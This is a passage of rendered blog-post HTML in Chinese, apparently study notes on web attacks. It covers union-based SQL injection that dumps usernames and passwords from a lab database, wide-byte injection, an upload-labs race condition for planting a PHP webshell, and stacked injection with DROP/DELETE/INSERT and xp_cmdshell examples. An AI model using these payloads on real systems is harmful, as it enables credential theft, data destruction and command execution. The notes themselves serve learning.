+        <h1 id="基础注入流程"><a href="#基础注入流程" class="headerlink" title="基础注入流程"></a>基础注入流程</h1><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><pre><code>**1、寻找注入点：**
+
+	和数据库有交互  ？aa=bbb
+
+**2、判断闭合方式(依靠数字型不需要闭合，字符型需要闭合）**
+
+	?id=1asdf  看是否报错：有报错：数字型  无报错：字符型
+</code></pre>
+<p>方法二：判断出注入类型涉及到了后续的注入过程中需不需要闭合单引号(‘)，通过“1and 1&#x3D;1#”和“1’and 1&#x3D;2#”进行判断，如果页面有不同的变化，则说明是字符型的注入，因为字符型的参数是需要引号引起来的。</p>
+<pre><code>**3、再判断闭合方式**
+
+	?id=1asdf&#39; 通过 () “” ‘’ 必须两两互相匹配的道理来判断闭合的方式
+</code></pre>
+<blockquote>
+<p>select * from users where id&#x3D;’1asdf’ – ‘ limit 0,1</p>
+</blockquote>
+<pre><code>**4、判断数据库有几列以及回显位**
+</code></pre>
+<blockquote>
+<p>?id &#x3D; 1’ order by 3 –+来实现判断这个数据库有几列  （–+是注释的意思）<br><img src="/.com//image-20250113172420-37zqzqi.png" alt="image">order by即通过第几列排序的意思</p>
+</blockquote>
+<pre><code>	?id=-1&#39; union select1,2,3 --+ 我们改成-1是为了前面不查询类容用union展示，这个也是为了判断回显位
+
+ **获取数据库名 ： security**​​
+</code></pre>
+<blockquote>
+<p>将回显位改为database()  ?id&#x3D;-1’ union select1,database(),3 –+</p>
+</blockquote>
+<pre><code>**获取表名 ：emails，less39，referers，uagents，users**
+</code></pre>
+<blockquote>
+<p>?id=1’union select 1,2,group_concat(table_name) from information_schema.t<br> ables where table_schema=database()</p>
+</blockquote>
+<blockquote>
+<p>?id&#x3D;-1’ union select1,(select group<a href>_concat(table</a>_name) from information_schema.tables where table_schema&#x3D;’security’ ),3 –+</p>
+</blockquote>
+<pre><code>**group_concat:**  把它合并成一个字符串
+
+**tables_name:**  表名
+
+**information_schema:**  MYSQL下的一个数据库
+</code></pre>
+<p>‍</p>
+<pre><code>**获取列名：获取users表的列名：id，username，password**
+</code></pre>
+<blockquote>
+<p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from information_schema.columns where tables_schema&#x3D;’security’ and table_name &#x3D; ‘users’),3 –+</p>
+</blockquote>
+<pre><code>**获取具体数据：**
+</code></pre>
+<blockquote>
+<p>?id &#x3D; -1’ union select 1,(select group_concat(username) from users),3 –+</p>
+</blockquote>
+<p>‍</p>
+<h3 id="取库名："><a href="#取库名：" class="headerlink" title="取库名："></a>取库名：</h3><blockquote>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+</blockquote>
+<h3 id="取表名："><a href="#取表名：" class="headerlink" title="取表名："></a>取表名：</h3><blockquote>
+<p>?id&#x3D;-1’ union select1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’,3 –+</p>
+</blockquote>
+<h3 id="取列名："><a href="#取列名：" class="headerlink" title="取列名："></a>取列名：</h3><blockquote>
+<p>?id&#x3D;-1’ union select1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’,3 –+</p>
+</blockquote>
+<h3 id="取密码，用户名："><a href="#取密码，用户名：" class="headerlink" title="取密码，用户名："></a>取密码，用户名：</h3><blockquote>
+<p>?id&#x3D;-1’ union select1,group_concat(password) from security.users,3 –+</p>
+</blockquote>
+<h3 id="拼接用户名和密码"><a href="#拼接用户名和密码" class="headerlink" title="拼接用户名和密码"></a>拼接用户名和密码</h3><blockquote>
+<p><strong>concat_ws(‘~’,A,B)</strong>  拼接 A~B</p>
+</blockquote>
+<blockquote>
+<p>?id&#x3D;-1’ union select1,group_concat(concat_ws(‘~’,username,password)) from security.users,3 –+</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" data-id="cmawal1j90021bo7k6dm83h6m" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/宽字节注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。</p>
+<p><strong>字符集:</strong> 也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集:<br> <strong>·ASCII编码:</strong> 单字节编码。<br> <strong>·gbk编码:</strong> 使用一字节和双字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。双字节的第一字节范围是0x81-0xFE。<br> <strong>·UTF-8编码:</strong> 使用一至四字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。其它字符用二至四个字节变长表示。<br><strong>宽字节:</strong> 就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
+<p>通常来说，一个gbk编码汉字，占用<strong>2个</strong>字节。一个utf-8编码的汉字，占用<strong>3个</strong>字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawal1jb0026bo7kggpacxde" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/Apache解析漏洞+条件竞争" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache解析漏洞-条件竞争"><a href="#Apache解析漏洞-条件竞争" class="headerlink" title="Apache解析漏洞+条件竞争"></a>Apache解析漏洞+条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">  </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先检查后缀，再到服务器,不能直接上传php文件了，apache从后往前看，不能去解析那个.7z文件那么就会往前面解析php文件</p>
+<p>我们要在重命名之前,对那个访问小马文件进行访问，就可以留下一句话木马</p>
+<p>在上传抓包生成小马文件后，在末尾加上.7z</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" data-id="cmawal1jb0027bo7khkq60ab0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
+<p>mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入</p>
+<p>而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句&#x3D;&#x3D;类型是有限&#x3D;&#x3D;的，可以用来执行查询语句，而堆叠注入可以&#x3D;&#x3D;执行&#x3D;&#x3D;的是&#x3D;&#x3D;任意的语句&#x3D;&#x3D;。</p>
+<p><strong>eg</strong></p>
+<p>用户输入：<code>1; DELETE FROM products</code>​</p>
+<p>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>​</p>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+</blockquote>
+<p>‍</p>
+<h1 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h1><blockquote>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img src="/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" alt="1049983-20180929015645345-261813262"></p>
+<p>此图是从<strong>原文</strong>中<strong>截取</strong>过来的，因为我个人的<strong>测试环境</strong>是<strong>php+mysql</strong>，是<strong>可以执行</strong>的，此处对于<strong>mysql&#x2F;php存在质疑</strong>。但个人估计原文作者可能与我的<strong>版本的不同</strong>的原因。虽然我们前面提到了堆叠查询可以<strong>执行任意的sql</strong>语句，但是这种注入方式<strong>并不是</strong>十分的<strong>完美</strong>的。在我们的web系统中，因为代码通常<strong>只返回一个查询结果</strong>，因此，堆叠注入<strong>第二个</strong>语句<strong>产生错误</strong>或者<strong>结果</strong>只能被<strong>忽略</strong>，我们在<strong>前端</strong>界面是<strong>无法看到</strong>返回<strong>结果</strong>的。因此，在读取数据时，我们建议使用<strong>union（联合）</strong> 注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+</blockquote>
+<p>‍</p>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>（1）新建一表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" alt="1049983-20180929015645671-1445708848"></p>
+<p>执行成功，我们再去看一下是否新建成功表。</p>
+<p><img src="/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" alt="1049983-20180929015645943-40278598"></p>
+<p>（2）删除上面新建的test表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" alt="1049983-20180929015646198-1529755622"></p>
+<p><img src="/.com//1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" alt="1049983-20180929015646449-976012187"></p>
+<p>（3）查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" alt="1049983-20180929015646651-307633841"></p>
+<p>（4）加载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select load_file(&#x27;c:/tmpupbbn.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" alt="1049983-20180929015646928-818625825"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" alt="1049983-20180929015647123-855312514"></p>
+<p><img src="/.com//1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" alt="1049983-20180929015647385-1686789783"></p>
+<h2 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h2><p>(1)增加数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;create table sc3(ss CHAR(8));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" alt="1049983-20180929015647694-982429887"></p>
+<p>(2) 删除数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;drop table sc3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" alt="1049983-20180929015648051-1234311462"></p>
+<p>(4)查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" alt="1049983-20180929015648347-1625714699"></p>
+<p>(5)修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;update test set name=&#x27;test&#x27; where id=3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" alt="1049983-20180929015648636-932399825"></p>
+<p><img src="/.com//1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" alt="1049983-20180929015648911-1380875302"></p>
+<p>(5)sqlserver中最为重要的存储过程的执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1;exec master..xp_cmdshell &#x27;ipconfig&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015649295-413295225-20250418145603-v0relca.gif" alt="1049983-20180929015649295-413295225"></p>
+<h2 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h2><blockquote>
+<p>上面的介绍中我们已经提及，&#x3D;&#x3D;oracle不能使用堆叠注入&#x3D;&#x3D;，可以从图中看到，当有&#x3D;&#x3D;两条语句在同一行时&#x3D;&#x3D;，&#x3D;&#x3D;直接报错,无效字符&#x3D;&#x3D;。后面的就不往下继续尝试了。</p>
+</blockquote>
+<p><img src="/.com//1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" alt="1049983-20180929015649555-1984392073"></p>
+<h2 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h2><p>(1)新建一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;create table user_data(id DATE);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" alt="1049983-20180929015649893-911848487"></p>
+<p><img src="/.com//1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" alt="1049983-20180929015650150-1255028615"></p>
+<p>可以看到user_data表已经建好。</p>
+<p>(2)删除上面新建的user_data表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;delete from user_data;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" alt="1049983-20180929015650516-1080177008"></p>
+<p>(3)查询数据</p>
